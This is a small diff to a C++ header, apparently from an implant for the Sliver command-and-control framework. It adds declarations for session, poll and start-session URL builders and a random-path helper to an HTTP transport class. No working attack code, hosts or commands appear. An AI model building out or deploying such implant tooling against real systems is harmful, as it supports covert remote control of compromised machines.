@@ -4,6 +4,7 @@
 #include <cpr/cpr.h>
 #include "CipherContext.h"
 #include <mutex>
+#include <vector>
 
 using namespace std;
 namespace transports{
@@ -25,6 +26,10 @@ namespace transports{
 		bool WriteEnvelope(sliverpb::Envelope&) override;
 		bool WriteEnvelopeNoResp(sliverpb::Envelope&) override;
 		bool WriteAndReceive(const sliverpb::Envelope&,sliverpb::Envelope&) override;
+		string SessionURL();
+		string PollURL();
+		string StartSessionURL();
+		std::vector<string> RandomPath(std::vector<string>&, std::vector<string>&, string);
 		unique_ptr<sliverpb::Envelope> ReadEnvelope() override;
 
 		std::chrono::system_clock::duration timeDelta;
